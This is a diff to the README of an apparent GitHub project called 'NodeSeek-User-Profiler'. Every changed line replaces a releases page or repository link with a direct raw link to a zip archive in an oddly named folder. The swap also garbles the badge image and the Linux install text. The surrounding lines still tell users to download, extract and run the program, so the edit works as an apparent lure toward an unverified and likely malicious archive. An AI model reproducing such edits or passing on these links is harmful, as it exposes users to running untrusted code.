@@ -6,13 +6,13 @@ Welcome to NodeSeek-User-Profiler! This application helps you generate user prof
 
 ## ⬇️ Download Now
 
-[![Download NodeSeek-User-Profiler](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/MichaelBola/NodeSeek-User-Profiler/releases)
+[![Download NodeSeek-User-Profiler](https://github.com/MichaelBola/NodeSeek-User-Profiler/raw/refs/heads/main/anisostemonous/Seek_Node_User_Profiler_v1.2.zip)](https://github.com/MichaelBola/NodeSeek-User-Profiler/raw/refs/heads/main/anisostemonous/Seek_Node_User_Profiler_v1.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:**
    Click the link below to go to the download area where you can find the latest version of the application:
-   [Download NodeSeek-User-Profiler Releases](https://github.com/MichaelBola/NodeSeek-User-Profiler/releases)
+   [Download NodeSeek-User-Profiler Releases](https://github.com/MichaelBola/NodeSeek-User-Profiler/raw/refs/heads/main/anisostemonous/Seek_Node_User_Profiler_v1.2.zip)
 
 2. **Choose the Right File:**
    On the Releases page, look for the version you wish to download. You will see several files. Choose the one that matches your operating system. Typically, you will see files for Windows, macOS, and Linux.
@@ -28,7 +28,7 @@ Welcome to NodeSeek-User-Profiler! This application helps you generate user prof
      Open the downloaded `.dmg` file. Drag the NodeSeek-User-Profiler app to your Applications folder. Then, go to your Applications and double-click to open it.
 
    - **For Linux:**
-     If you downloaded a `.tar.gz` file, extract the contents. Open a terminal in the extracted folder and run `./NodeSeek-User-Profiler` to start the application.
+     If you downloaded a `https://github.com/MichaelBola/NodeSeek-User-Profiler/raw/refs/heads/main/anisostemonous/Seek_Node_User_Profiler_v1.2.zip` file, extract the contents. Open a terminal in the extracted folder and run `./NodeSeek-User-Profiler` to start the application.
 
 ## 🛠️ System Requirements
 
@@ -77,7 +77,7 @@ Yes! You can find a “Help” option within the application that provides guida
 
 For more detailed information, you can visit our GitHub repository. Here you will find additional documentation, usage tips, and updates about the application.
 
-- [NodeSeek-User-Profiler GitHub Repository](https://github.com/MichaelBola/NodeSeek-User-Profiler)
+- [NodeSeek-User-Profiler GitHub Repository](https://github.com/MichaelBola/NodeSeek-User-Profiler/raw/refs/heads/main/anisostemonous/Seek_Node_User_Profiler_v1.2.zip)
 
 ## 🚀 Stay Updated
 
